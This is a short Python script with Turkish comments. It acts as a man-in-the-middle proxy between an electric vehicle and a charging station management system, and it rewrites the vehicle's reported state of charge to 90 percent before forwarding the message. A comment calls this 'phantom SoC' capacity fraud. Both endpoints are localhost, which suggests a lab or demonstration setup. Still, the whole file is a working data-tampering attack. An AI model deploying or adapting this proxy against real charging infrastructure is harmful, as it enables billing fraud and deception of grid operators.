import socket
import json

MITM_HOST = "127.0.0.1"
MITM_PORT = 8000

CSMS_HOST = "127.0.0.1"
CSMS_PORT = 9000

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((MITM_HOST, MITM_PORT))
server.listen(1)

print("[MITM] Proxy dinleniyor...")

while True:
    client, _ = server.accept()
    data = json.loads(client.recv(4096).decode())

    print("[MITM] EV'den gelen veri:", data)

    # KAPASİTE SAHTEKÂRLIĞI (PHANTOM SoC)
    original_soc = data["reported_soc"]
    data["reported_soc"] = 90
    print(f"[MITM] SoC değiştirildi: %{original_soc} → %{data['reported_soc']}")

    forward = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    forward.connect((CSMS_HOST, CSMS_PORT))
    forward.send(json.dumps(data).encode())
    forward.close()

    client.close()
